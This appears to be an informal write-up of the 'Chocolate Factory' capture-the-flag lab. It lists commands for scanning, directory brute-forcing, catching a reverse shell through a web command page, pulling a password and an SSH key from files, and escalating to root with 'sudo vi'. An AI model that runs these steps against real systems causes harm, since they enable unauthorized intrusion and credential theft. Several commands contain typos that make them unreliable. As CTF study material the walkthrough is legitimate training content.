########  To solve chocolate factory 
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

1)  nmap scanning 
          [nmap -sV IP]

2)then on next terminalt bay adding, we gonna use 'gobuste' command to retrive/ to see which file is in the given IP(website)
          [udo gobuster dir -u http://10.10.122.243/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -x html,         php,txt]

3) then we gonna try to run the given IP address on browser 
      {http://IP}
      and again
      {http://IP/home.php}
wow! we found  'Command box and excute' page

after this process we need to use 'revese shell'
=> To use revese shell  
                        { we wiil go to 'www.revshells.com'
                        then we will find  where we gonna asign PORT and laptop IP(int 0)   
                        then we gonna  add new tab to Teminal 'Newtab' then 
                        we gonna start lestining to the required port and try to get into diretories

                         [nc -lvp 4545]

                       it will start lestinig to the provided 

                       then 
                       [ whoami]
                        
                        [python3 -3 'import pty;pty.spawn("/bin/bash")]
                        
                        [ls]
                        
                        [cat key_rev_key]

                =>> then i will find first key ]

                        [export TERM=xterm]

                        [clear]

                ====>then found clean terminal]
                        
                        [ls

                        [cat validate.php]

              ======>then we found 'password' for charlie "cn7824"

                        [cd /]

                        [ls]

                        [cd home]

                        [ls ]

                        [cd charlie]

                        [ls]

                        [cat teleport]

              ======>we found  alot of 'encoded tex' so we have to copy it
                   
     so again we gona open New Tap for command  and try to decode it

     on new TERMINAL
             
             [vi id_rsa.key]

      then we wil paste the key or encoded text and save it.
            
             [chmod 400 id_rsa.key]

             [ssh -i id_rsa.key charlie@IP]

=====> by saying 'yes' we gonna get into 'charlie@chocolate-factory:/$'
    
              [ls]

              [cd home]

              [ls]

              [cd charlie]

              [ls]

              [cat user.txt]

BOOM we got 'flag'
              
              [cd /]

              [ls]

              [sudo -l]

              [sudo vi -c ':!/bin/sh' /dev/null]

              [whoami]

wow! i am  root

              [ls]

              [cd root]
              
              ls]

              [python root.p]y

====> then we gonna  put the first key wefound

Boom!   I am  the owner of chocolate factory

     we will foinf the final flag
              
     


DANE!


                       ]
